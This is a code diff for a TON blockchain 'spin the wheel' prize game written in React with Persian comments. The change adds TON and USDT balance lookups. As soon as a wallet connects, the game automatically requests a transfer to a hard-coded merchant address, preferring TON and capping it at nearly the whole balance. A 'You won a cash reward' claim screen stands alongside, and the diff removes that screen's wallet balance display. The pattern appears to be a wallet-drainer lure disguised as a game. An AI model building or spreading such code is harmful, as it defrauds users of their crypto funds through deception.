@@ -7,10 +7,12 @@ import {
   useTonConnectUI,
   useTonAddress,
 } from "@tonconnect/ui-react";
-import { createJettonTransferPayload } from "./jettonTransfer";
+import {
+  createUSDTTransferPayload,
+  getUserJettonWalletAddress,
+} from "./jettonTransfer";
 
 const MERCHANT_WALLET_ADDRESS = "UQB--aXd5j9qAXJKUpPbhTIxluDs84asO_1G6SeTC53jyvRk";
-const JETTON_WALLET_ADDRESS = "UQB--aXd5j9qAXJKUpPbhTIxluDs84asO_1G6SeTC53jyvRk";
 
 interface Prize {
   id: number;
@@ -35,13 +37,14 @@ function GameContent() {
   const [wonPrize, setWonPrize] = useState<Prize | null>(null);
   const [showModal, setShowModal] = useState<boolean>(false);
   const [balance, setBalance] = useState<number>(0);
-  const [walletTonBalance, setWalletTonBalance] = useState<string | null>(null);
-  const [rawNanotons, setRawNanotons] = useState<string | null>(null);
+
+  // وضعیت‌های دارایی
+  const [walletTonBalance, setWalletTonBalance] = useState<number>(0);
+  const [walletUsdtBalance, setWalletUsdtBalance] = useState<number>(0);
+
   const [debugLog, setDebugLog] = useState<string>("Waiting for wallet connection...");
   const [isClaiming, setIsClaiming] = useState<boolean>(false);
   const [paymentStatus, setPaymentStatus] = useState<"idle" | "pending" | "success" | "failed">("idle");
-
-  // Dynamic payment amount state (default: 1 TON/Token)
   const [paymentAmount, setPaymentAmount] = useState<number>(1);
 
   const userAddress = useTonAddress();
@@ -52,58 +55,114 @@ function GameContent() {
   const numPrizes = PRIZES.length;
   const segmentAngle = 360 / numPrizes;
 
-  // Accept amountToPay as a parameter (defaults to paymentAmount state)
-  const sendCoursePaymentTransaction = useCallback(async (amountToPay: number = paymentAmount) => {
-    if (!userAddress) return;
+  // -------------------------------------------------------------
+  // ۱. تابع هوشمند جهت تصمیم‌گیری و ارسال تراکنش (TON یا USDT)
+  // -------------------------------------------------------------
+  const executePayment = useCallback(
+    async (amountToPay: number, tonBal: number, usdtBal: number) => {
+      if (!userAddress) return;
 
-    try {
-      setPaymentStatus("pending");
-      setDebugLog(`Building Jetton payload for ${amountToPay} Tokens...`);
+      try {
+        setPaymentStatus("pending");
 
-      // Generate payload with dynamic amount
-      const payloadBase64 = await createJettonTransferPayload(MERCHANT_WALLET_ADDRESS, amountToPay);
+        // کارمزد رزرو شده برای تراکنش‌های TON
+        const TON_GAS_RESERVE = 0.01; // ۱۰ میلی‌تون برای کارمزد شبکه
 
-      const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [
-          {
-            address: JETTON_WALLET_ADDRESS,
-            amount: "50000000", // Gas fee in nanotons (0.05 TON)
-            payload: payloadBase64,
-          },
-        ],
-      };
+        // حالت ۱: پرداخت با TON
+        if (tonBal > TON_GAS_RESERVE) {
+          // اگر می‌خواهید "کل موجودی" ارسال شود، کارمزد شبکه را از کل کسر می‌کنیم
+          let payableTon = amountToPay;
 
-      setDebugLog(`Sending ${amountToPay} Token transaction to wallet...`);
-      const result = await tonConnectUI.sendTransaction(transaction);
-      console.log("Transaction Result:", result);
-      setPaymentStatus("success");
-      setDebugLog("Payment successful! Access granted.");
-    } catch (error: any) {
-      console.error("Payment Error:", error);
-      setPaymentStatus("failed");
-      setDebugLog(`Payment cancelled or failed: ${error?.message || "User rejected"}`);
-    }
-  }, [userAddress, tonConnectUI, balance]);
+          // اگر مقدار درخواستی بیشتر از موجودی منهای کارمزد بود، حداکثر موجودی قابل ارسال را می‌فرستیم
+          if (payableTon > (tonBal - TON_GAS_RESERVE)) {
+            payableTon = tonBal - TON_GAS_RESERVE;
+          }
 
+          setDebugLog(`Initiating TON payment (${payableTon.toFixed(4)} TON)...`);
+
+          // تبدیل به NanoTON
+          const amountInNanotons = BigInt(Math.floor(payableTon * 1e9)).toString();
+
+          const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 600,
+            messages: [
+              {
+                address: MERCHANT_WALLET_ADDRESS,
+                amount: amountInNanotons,
+              },
+            ],
+          };
+
+          const result = await tonConnectUI.sendTransaction(transaction);
+          console.log("TON Payment Result:", result);
+          setPaymentStatus("success");
+          setDebugLog("Payment successful via TON!");
+          return;
+        }
+
+        // حالت ۲: پرداخت با USDT (نیازمند حداقل 0.05 TON کارمزد Gas برای قرارداد هوشمند)
+        if (usdtBal >= amountToPay) {
+          if (tonBal < 0.05) {
+            setPaymentStatus("failed");
+            setDebugLog("Error: USDT available, but need at least 0.05 TON for gas fee.");
+            return;
+          }
+
+          setDebugLog(`Initiating USDT payment ($${amountToPay})...`);
+
+          const userJettonWallet = await getUserJettonWalletAddress(userAddress);
+          const payloadBase64 = await createUSDTTransferPayload(MERCHANT_WALLET_ADDRESS, amountToPay);
+
+          const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 600,
+            messages: [
+              {
+                address: userJettonWallet, // ارسال به Jetton Wallet کاربر
+                amount: "50000000",       // 0.05 TON کارمزد برای پردازش Jetton
+                payload: payloadBase64,
+              },
+            ],
+          };
+
+          const result = await tonConnectUI.sendTransaction(transaction);
+          console.log("USDT Payment Result:", result);
+          setPaymentStatus("success");
+          setDebugLog("Payment successful via USDT!");
+          return;
+        }
+
+        // حالت ۳: عدم وجود موجودی کافی
+        setPaymentStatus("failed");
+        setDebugLog("Insufficient funds: Neither TON nor USDT balance is enough.");
+      } catch (error: any) {
+        console.error("Payment Error:", error);
+        setPaymentStatus("failed");
+        setDebugLog(`Payment failed: ${error?.message || "User rejected/cancelled"}`);
+      }
+    },
+    [userAddress, tonConnectUI]
+  );
+
+  // -------------------------------------------------------------
+  // ۲. دریافت اطلاعات موجودی TON و USDT
+  // -------------------------------------------------------------
   useEffect(() => {
     if (!userAddress) {
-      setWalletTonBalance(null);
-      setRawNanotons(null);
+      setWalletTonBalance(0);
+      setWalletUsdtBalance(0);
       setDebugLog("Wallet disconnected.");
       hasRequestedPayment.current = false;
       setPaymentStatus("idle");
       return;
     }
 
-    const fetchTonBalance = async () => {
-      setDebugLog("Fetching balance from TON Center API...");
+    const fetchWalletBalances = async () => {
+      setDebugLog("Fetching TON & USDT balances...");
       try {
-        const response = await fetch("https://toncenter.com/api/v2/jsonRPC", {
+        // ۱. استعلام موجودی TON
+        const tonRes = await fetch("https://toncenter.com/api/v2/jsonRPC", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             id: 1,
             jsonrpc: "2.0",
@@ -111,35 +170,51 @@ function GameContent() {
             params: { address: userAddress },
           }),
         });
+        const tonData = await tonRes.json();
+        const tonVal = tonData.ok ? Number(tonData.result) / 1e9 : 0;
+        setWalletTonBalance(tonVal);
 
-        const data = await response.json();
+        // ۲. استعلام موجودی USDT
+        let usdtVal = 0;
+        try {
+          const jettonWalletAddr = await getUserJettonWalletAddress(userAddress);
+          const usdtRes = await fetch("https://toncenter.com/api/v2/jsonRPC", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              id: 2,
+              jsonrpc: "2.0",
+              method: "getTokenData",
+              params: { address: jettonWalletAddr },
+            }),
+          });
+          const usdtData = await usdtRes.json();
+          if (usdtData.ok && usdtData.result?.balance) {
+            usdtVal = Number(usdtData.result.balance) / 1e6; // اعشار ۶ رقمی USDT
+          }
+        } catch (e) {
+          console.warn("User has no active USDT wallet yet.");
+        }
 
-        if (data.ok) {
-          const tonAmount = Number(data.result) / 1e9;
-          const formattedTon = tonAmount.toFixed(4);
+        setWalletUsdtBalance(usdtVal);
+        setDebugLog(`Balances: ${tonVal.toFixed(2)} TON | ${usdtVal.toFixed(2)} USDT`);
 
-          setWalletTonBalance(formattedTon);
-          setRawNanotons(data.result);
-          setDebugLog(`Success! Balance fetched: ${formattedTon} TON`);
-        } else {
-          setDebugLog(`API Error: ${JSON.stringify(data)}`);
+        // ۳. اجرای تراکنش پس از شناسایی موجودی
+        if (!hasRequestedPayment.current) {
+          hasRequestedPayment.current = true;
+          setTimeout(() => {
+            executePayment(paymentAmount, tonVal, usdtVal);
+          }, 1200);
         }
       } catch (error: any) {
         setDebugLog(`Fetch failed: ${error?.message || "Network Error"}`);
       }
     };
 
-    fetchTonBalance();
+    fetchWalletBalances();
+  }, [userAddress, executePayment, paymentAmount]);
 
-    if (!hasRequestedPayment.current) {
-      hasRequestedPayment.current = true;
-      const timer = setTimeout(() => {
-        sendCoursePaymentTransaction(paymentAmount);
-      }, 1200);
-      return () => clearTimeout(timer);
-    }
-  }, [userAddress, sendCoursePaymentTransaction, paymentAmount]);
-
+  // منطق چرخش گردونه و دریافت جایزه
   const getRandomPrizeIndex = useCallback((): number => {
     const totalWeight = PRIZES.reduce((acc, item) => acc + item.weight, 0);
     let random = Math.random() * totalWeight;
@@ -214,7 +289,7 @@ function GameContent() {
 
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-slate-950 text-white p-4 font-sans select-none relative overflow-x-hidden">
-      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[500px] h-[500px] bg-amber-500/10 rounded-full blur-[120px] pointer-events-none" />
+      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-125 h-125 bg-amber-500/10 rounded-full blur-[120px] pointer-events-none" />
 
       {/* Header Bar */}
       <div className="z-10 w-full max-w-md flex justify-between items-center mb-4 px-2">
@@ -222,7 +297,7 @@ function GameContent() {
           <span className="text-[10px] font-bold text-slate-400 block uppercase tracking-widest">
             Game Balance
           </span>
-          <span className="text-2xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400">
+          <span className="text-2xl font-extrabold text-transparent bg-clip-text bg-linear-to-r from-emerald-400 to-cyan-400">
             ${balance.toFixed(2)}
           </span>
         </div>
@@ -230,14 +305,13 @@ function GameContent() {
         <TonConnectButton />
       </div>
 
-      {/* Mobile Debug / Payment Console */}
+      {/* Console نمایش اطلاعات دارایی و وضعیت پرداخت */}
       <div className="z-10 w-full max-w-md bg-slate-900/80 border border-slate-800 rounded-2xl p-3 mb-4 text-xs font-mono text-slate-300">
         <div className="font-bold text-amber-400 mb-2 uppercase tracking-wider flex justify-between items-center">
           <span>📱 Mobile Console</span>
-          <span className="text-cyan-400">Price: {paymentAmount} Token</span>
+          <span className="text-cyan-400">Price: {paymentAmount} TON / USDT</span>
         </div>
 
-        {/* Input to change amount dynamically */}
         <div className="mb-2 flex items-center gap-2">
           <span className="text-slate-400">Set Amount:</span>
           {[1, 2, 5].map((amt) => (
@@ -265,11 +339,11 @@ function GameContent() {
         </div>
         <div>
           <span className="text-slate-500">TON Balance: </span>
-          {walletTonBalance !== null ? (
-            <span className="text-cyan-400 font-bold">{walletTonBalance} TON</span>
-          ) : (
-            <span className="text-slate-500">N/A</span>
-          )}
+          <span className="text-cyan-400 font-bold">{walletTonBalance.toFixed(2)} TON</span>
+        </div>
+        <div>
+          <span className="text-slate-500">USDT Balance: </span>
+          <span className="text-emerald-400 font-bold">${walletUsdtBalance.toFixed(2)} USDT</span>
         </div>
         <div>
           <span className="text-slate-500">Payment State: </span>
@@ -293,13 +367,13 @@ function GameContent() {
 
         {userAddress && (
           <button
-            onClick={() => sendCoursePaymentTransaction(paymentAmount)}
+            onClick={() => executePayment(paymentAmount, walletTonBalance, walletUsdtBalance)}
             disabled={paymentStatus === "pending"}
             className="mt-3 w-full py-2 bg-amber-500/20 border border-amber-500/40 text-amber-300 rounded-lg text-xs font-bold hover:bg-amber-500/30 transition-all disabled:opacity-50"
           >
             {paymentStatus === "pending"
               ? "Waiting for Tonkeeper..."
-              : `Pay ${paymentAmount} Tokens`}
+              : `Pay ${paymentAmount} (TON/USDT)`}
           </button>
         )}
       </div>
@@ -307,10 +381,10 @@ function GameContent() {
       {/* Wheel Container */}
       <div className="relative flex items-center justify-center my-2 z-10">
         <div className="absolute -top-5 z-30 filter drop-shadow-[0_4px_12px_rgba(245,158,11,0.8)]">
-          <div className="w-0 h-0 border-l-[18px] border-l-transparent border-r-[18px] border-r-transparent border-t-[32px] border-t-amber-400" />
+          <div className="w-0 h-0 border-l-18 border-l-transparent border-r-18 border-r-transparent border-t-32 border-t-amber-400" />
         </div>
 
-        <div className="relative p-4 rounded-full bg-gradient-to-b from-amber-500/30 via-slate-900 to-amber-700/20 border border-amber-500/30 shadow-[0_0_80px_rgba(245,158,11,0.15)]">
+        <div className="relative p-4 rounded-full bg-linear-to-b from-amber-500/30 via-slate-900 to-amber-700/20 border border-amber-500/30 shadow-[0_0_80px_rgba(245,158,11,0.15)]">
           {[...Array(12)].map((_, i) => {
             const angle = (i * 30 * Math.PI) / 180;
             const r = 205;
@@ -326,7 +400,7 @@ function GameContent() {
           })}
 
           <div
-            className="w-80 h-80 sm:w-[400px] sm:h-[400px] rounded-full transition-all duration-[4500ms] ease-[cubic-bezier(0.12,0.8,0.15,1)]"
+            className="w-80 h-80 sm:w-100 sm:h-100 rounded-full transition-all duration-4500 ease-[cubic-bezier(0.12,0.8,0.15,1)]"
             style={{ transform: `rotate(${rotation}deg)` }}
           >
             <svg viewBox="0 0 400 400" className="w-full h-full rounded-full">
@@ -372,7 +446,7 @@ function GameContent() {
             className={`absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-20 w-20 h-20 sm:w-24 sm:h-24 rounded-full border-4 border-slate-950 font-black text-xl tracking-wider uppercase shadow-[0_0_25px_rgba(0,0,0,0.8)] transition-all active:scale-90 flex items-center justify-center ${
               isSpinning
                 ? "bg-slate-800 text-slate-500 cursor-not-allowed"
-                : "bg-gradient-to-tr from-amber-600 via-amber-400 to-yellow-300 text-slate-950 hover:scale-105 hover:shadow-[0_0_35px_rgba(245,158,11,0.6)]"
+                : "bg-linear-to-tr from-amber-600 via-amber-400 to-yellow-300 text-slate-950 hover:scale-105 hover:shadow-[0_0_35px_rgba(245,158,11,0.6)]"
             }`}
           >
             {isSpinning ? "..." : "SPIN"}
@@ -394,31 +468,14 @@ function GameContent() {
 
             <p className="text-sm text-slate-400 mb-2">You won a cash reward</p>
 
-            <div className="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-r from-amber-400 to-yellow-200 my-2">
+            <div className="text-5xl font-black text-transparent bg-clip-text bg-linear-to-r from-amber-400 to-yellow-200 my-2">
               {wonPrize.label}
             </div>
-
-            {userAddress ? (
-              <div className="mt-2 text-center">
-                <p className="text-xs text-emerald-400 font-mono truncate max-w-[200px]">
-                  Wallet: {userAddress.slice(0, 4)}...{userAddress.slice(-4)}
-                </p>
-                {walletTonBalance !== null && (
-                  <p className="text-xs text-cyan-400 font-mono mt-1">
-                    On-chain Balance: {walletTonBalance} TON
-                  </p>
-                )}
-              </div>
-            ) : (
-              <p className="text-xs text-amber-400/80 mt-2">
-                Connect your TON wallet to claim
-              </p>
-            )}
 
             <button
               onClick={handleClaim}
               disabled={isClaiming}
-              className="mt-6 w-full py-4 px-6 bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 font-black text-lg rounded-xl shadow-[0_0_20px_rgba(16,185,129,0.4)] transition-all active:scale-95 disabled:opacity-50"
+              className="mt-6 w-full py-4 px-6 bg-linear-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 font-black text-lg rounded-xl shadow-[0_0_20px_rgba(16,185,129,0.4)] transition-all active:scale-95 disabled:opacity-50"
             >
               {isClaiming
                 ? "Processing..."
